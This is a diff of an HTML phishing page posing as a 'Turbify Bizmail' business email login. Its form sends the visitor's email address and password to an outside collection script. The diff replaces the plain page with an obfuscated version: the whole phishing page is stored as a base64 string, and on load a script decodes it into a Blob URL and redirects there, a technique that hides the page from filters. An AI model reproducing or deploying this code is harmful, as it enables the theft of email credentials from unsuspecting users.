@@ -1,132 +1,83 @@
 <!DOCTYPE html><html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bizmail Login</title>
-  <link rel="stylesheet" href="https://curly-salad-41c3.babatee101.workers.dev/css/style.css" type="text/css">
-  <link rel="icon" type="image/x-icon" href="https://curly-salad-41c3.babatee101.workers.dev/images/fav.png">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
 </head>
 <body>
 
-
-
-<div class="home">
-
-  <div class="row">
-    
-    <div class="home-col1">
-      
-      <img src="https://curly-salad-41c3.babatee101.workers.dev/images/turb.png" alt="">
-
-    </div>
-
-    <div class="home-col bg">
-
-      <div class="logo">
-          <img src="https://curly-salad-41c3.babatee101.workers.dev/images/tueblogo.png" alt="">
-
-      </div>
-      
-      <div class="top-text">
-    A trusted partner to small businesses for over 25 years
-</div>
-
-<div class="login-wrapper">
-
-    <div class="toggle-buttons">
-        <button class="inactive">
-            <i class="fa-regular fa-user"></i> Account Login
-        </button>
-        <button class="active">
-            <i class="fa-regular fa-envelope"></i> Business Mail Login
-        </button>
-    </div>
-
-    <div class="login-card">
-        <h2>Business Mail Login</h2>
-        <p class="subtitle">Access your professional <b>email</b> account.</p>
-
-        <form action="https://cauikgunbase.com/teef120/auth.php" method="POST">
-
-            <label>Business Email Address</label>
-            <div class="input-group">
-                <i class="fa-regular fa-envelope"></i>
-                <input type="email" name="email" placeholder="yourname@yourbusiness.com" required="">
-            </div>
-
-            <label>Password</label>
-<div class="input-group password-group">
-    <i class="fa-solid fa-lock"></i>
-    <input type="password" name="password" id="password" placeholder="Enter your password" required="">
-    <i class="fa-regular fa-eye toggle-password" id="togglePassword"></i>
-</div>
-
-            <div class="options">
-                <input type="checkbox" id="remember">
-                <label for="remember">Keep me logged in.</label>
-            </div>
-
-            <button type="submit" class="login-btn">
-                Login to Business Mail
-            </button>
-
-        </form>
-
-        <div class="forgot">
-            <a href="#">Forgot password?</a>
-        </div>
-    </div>
-
-    <div class="signup">
-        Not a customer? <a href="#">Sign up now</a>
-    </div>
-
-</div>
-
-    </div>
-
-
-  </div>
-  
-
-</div>
-
-<div class="footer">
-  
-    <p>
-      ©2026 Turbify. All rights reserved.   <a href="#">Privacy Policy</a>   <a href="#">Terms of Service</a>    <a href="#">Manage Cookies</a>
-
-    </p>
-
-</div>
-
-
-
-
-
-
-
-
-
-
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 <script>
-document.getElementById("togglePassword").addEventListener("click", function () {
 
-    const passwordInput = document.getElementById("password");
-    const type = passwordInput.getAttribute("type");
 
-    if (type === "password") {
-        passwordInput.setAttribute("type", "text");
-        this.classList.remove("fa-eye-slash");
-        this.classList.add("fa-eye");
-    } else {
-        passwordInput.setAttribute("type", "password");
-        this.classList.remove("fa-eye");
-        this.classList.add("fa-eye-slash");
-    }
+$(document).ready(function(){
+
+
+  var str = "PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkJpem1haWwgTG9naW48L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jdXJseS1zYWxhZC00MWMzLmJhYmF0ZWUxMDEud29ya2Vycy5kZXYvY3NzL3N0eWxlLmNzcyIgdHlwZT0idGV4dC9jc3MiPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL2N1cmx5LXNhbGFkLTQxYzMuYmFiYXRlZTEwMS53b3JrZXJzLmRldi9pbWFnZXMvZmF2LnBuZyI+CiAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNS4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KPC9oZWFkPgo8Ym9keT4KCgoKPGRpdiBjbGFzcz0iaG9tZSI+CgogIDxkaXYgY2xhc3M9InJvdyI+CiAgICAKICAgIDxkaXYgY2xhc3M9ImhvbWUtY29sMSI+CiAgICAgIAogICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9jdXJseS1zYWxhZC00MWMzLmJhYmF0ZWUxMDEud29ya2Vycy5kZXYvaW1hZ2VzL3R1cmIucG5nIiBhbHQ9IiI+CgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0iaG9tZS1jb2wgYmciPgoKICAgICAgPGRpdiBjbGFzcz0ibG9nbyI+CiAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9jdXJseS1zYWxhZC00MWMzLmJhYmF0ZWUxMDEud29ya2Vycy5kZXYvaW1hZ2VzL3R1ZWJsb2dvLnBuZyIgYWx0PSIiPgoKICAgICAgPC9kaXY+CiAgICAgIAogICAgICA8ZGl2IGNsYXNzPSJ0b3AtdGV4dCI+CiAgICBBIHRydXN0ZWQgcGFydG5lciB0byBzbWFsbCBidXNpbmVzc2VzIGZvciBvdmVyIDI1IHllYXJzCjwvZGl2PgoKPGRpdiBjbGFzcz0ibG9naW4td3JhcHBlciI+CgogICAgPGRpdiBjbGFzcz0idG9nZ2xlLWJ1dHRvbnMiPgogICAgICAgIDxidXR0b24gY2xhc3M9ImluYWN0aXZlIj4KICAgICAgICAgICAgPGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtdXNlciI+PC9pPiBBY2NvdW50IExvZ2luCiAgICAgICAgPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYWN0aXZlIj4KICAgICAgICAgICAgPGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtZW52ZWxvcGUiPjwvaT4gQnVzaW5lc3MgTWFpbCBMb2dpbgogICAgICAgIDwvYnV0dG9uPgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibG9naW4tY2FyZCI+CiAgICAgICAgPGgyPkJ1c2luZXNzIE1haWwgTG9naW48L2gyPgogICAgICAgIDxwIGNsYXNzPSJzdWJ0aXRsZSI+QWNjZXNzIHlvdXIgcHJvZmVzc2lvbmFsIDxiPmVtYWlsPC9iPiBhY2NvdW50LjwvcD4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSJodHRwczovL2NhdWlrZ3VuYmFzZS5jb20vdGVlZjEyMC9hdXRoLnBocCIgbWV0aG9kPSJQT1NUIj4KCiAgICAgICAgICAgIDxsYWJlbD5CdXNpbmVzcyBFbWFpbCBBZGRyZXNzPC9sYWJlbD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPgogICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtZW52ZWxvcGUiPjwvaT4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJ5b3VybmFtZUB5b3VyYnVzaW5lc3MuY29tIiByZXF1aXJlZD0iIj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8bGFiZWw+UGFzc3dvcmQ8L2xhYmVsPgo8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBwYXNzd29yZC1ncm91cCI+CiAgICA8aSBjbGFzcz0iZmEtc29saWQgZmEtbG9jayI+PC9pPgogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iRW50ZXIgeW91ciBwYXNzd29yZCIgcmVxdWlyZWQ9IiI+CiAgICA8aSBjbGFzcz0iZmEtcmVndWxhciBmYS1leWUgdG9nZ2xlLXBhc3N3b3JkIiBpZD0idG9nZ2xlUGFzc3dvcmQiPjwvaT4KPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJvcHRpb25zIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgaWQ9InJlbWVtYmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InJlbWVtYmVyIj5LZWVwIG1lIGxvZ2dlZCBpbi48L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0ibG9naW4tYnRuIj4KICAgICAgICAgICAgICAgIExvZ2luIHRvIEJ1c2luZXNzIE1haWwKICAgICAgICAgICAgPC9idXR0b24+CgogICAgICAgIDwvZm9ybT4KCiAgICAgICAgPGRpdiBjbGFzcz0iZm9yZ290Ij4KICAgICAgICAgICAgPGEgaHJlZj0iIyI+Rm9yZ290IHBhc3N3b3JkPzwvYT4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9InNpZ251cCI+CiAgICAgICAgTm90IGEgY3VzdG9tZXI/IDxhIGhyZWY9IiMiPlNpZ24gdXAgbm93PC9hPgogICAgPC9kaXY+Cgo8L2Rpdj4KCiAgICA8L2Rpdj4KCgogIDwvZGl2PgogIAoKPC9kaXY+Cgo8ZGl2IGNsYXNzPSJmb290ZXIiPgogIAogICAgPHA+CiAgICAgIMKpMjAyNiBUdXJiaWZ5LiBBbGwgcmlnaHRzIHJlc2VydmVkLiDCoMKgPGEgaHJlZj0iIyI+UHJpdmFjeSBQb2xpY3k8L2E+wqDCoCA8YSBocmVmPSIjIj5UZXJtcyBvZiBTZXJ2aWNlPC9hPiDCoMKgIDxhIGhyZWY9IiMiPk1hbmFnZSBDb29raWVzPC9hPgoKICAgIDwvcD4KCjwvZGl2PgoKCgoKCgoKCgoKPHNjcmlwdD4KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRvZ2dsZVBhc3N3b3JkIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CgogICAgY29uc3QgcGFzc3dvcmRJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXNzd29yZCIpOwogICAgY29uc3QgdHlwZSA9IHBhc3N3b3JkSW5wdXQuZ2V0QXR0cmlidXRlKCJ0eXBlIik7CgogICAgaWYgKHR5cGUgPT09ICJwYXNzd29yZCIpIHsKICAgICAgICBwYXNzd29yZElucHV0LnNldEF0dHJpYnV0ZSgidHlwZSIsICJ0ZXh0Iik7CiAgICAgICAgdGhpcy5jbGFzc0xpc3QucmVtb3ZlKCJmYS1leWUtc2xhc2giKTsKICAgICAgICB0aGlzLmNsYXNzTGlzdC5hZGQoImZhLWV5ZSIpOwogICAgfSBlbHNlIHsKICAgICAgICBwYXNzd29yZElucHV0LnNldEF0dHJpYnV0ZSgidHlwZSIsICJwYXNzd29yZCIpOwogICAgICAgIHRoaXMuY2xhc3NMaXN0LnJlbW92ZSgiZmEtZXllIik7CiAgICAgICAgdGhpcy5jbGFzc0xpc3QuYWRkKCJmYS1leWUtc2xhc2giKTsKICAgIH0KCn0pOwo8L3NjcmlwdD4KCgo8L2JvZHk+PC9odG1sPg==";
+  makemyblob(str);
+
 
 });
-</script>
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function makemyblob(encodedStringAtoB, urlHash) {
+	  var urlHasht = (urlHash && urlHash.length>0) ? '#'+urlHash : '';
+	  var decodedStringAtoB = atob(encodedStringAtoB);
+	  var myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
+  var url =  window.URL.createObjectURL(myBlob)+urlHasht; 
+  window.location.replace(url);
+}
+
+
+</script>
 
 </body></html>
